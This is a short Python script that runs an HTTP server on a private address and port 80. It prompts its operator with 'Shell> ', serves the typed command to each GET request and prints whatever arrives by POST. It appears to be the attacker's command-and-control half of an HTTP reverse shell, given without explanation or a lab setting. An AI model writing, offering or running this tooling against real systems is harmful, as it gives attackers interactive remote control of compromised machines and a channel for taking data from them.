from http.server import BaseHTTPRequestHandler,HTTPServer

HOST_NAME = "192.168.0.10"
PORT_NUMBER = 80

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(s):
        command = input("Shell> ")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command.encode())

    def do_POST(s):
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        postVar = s.rfile.read(length)
        print(postVar.decode())

if __name__ == '__main__':
    server_class = HTTPServer
    httpd = server_class((HOST_NAME,PORT_NUMBER), MyHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[!] Server is terminated.")
        httpd.server_close()
